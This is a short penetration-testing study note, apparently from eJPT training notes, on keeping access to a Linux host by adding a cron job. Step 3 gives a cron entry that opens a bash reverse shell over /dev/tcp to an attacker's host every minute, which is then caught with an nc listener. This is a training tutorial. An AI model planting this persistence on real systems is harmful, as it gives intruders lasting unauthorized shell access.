
### Persistence Via Cron Jobs

+ Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.

+ An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job.

+ We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

### Anatomy of Cron Job

![image](https://github.com/B4PHOM3T/eJPT-Notes/assets/89618500/9bb9889f-429d-4e4c-a881-1764a31a3695)

### How to perform ?

1. Gain initial access. In our case, we'll be using SSH to get access.

2. We can enumerate the various cron jobs using `cat /etc/cron*`. This will display the Cron tab file.

3. We can add a Cron job which will connect to us using the following command
```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'" > cron
```

4. We check the content of the `cron` file which we saved. 

5. We can now add this Cron job using `crontab -i cron`.

6. List the Cron jobs added using `crontab -l`. This will run the Cron job with the permissions of the current user. 

7. Now we can setup a `nc` listener to get a connection from the Cron job whenever it runs. The shell we'll obtain will be an interactive shell. 
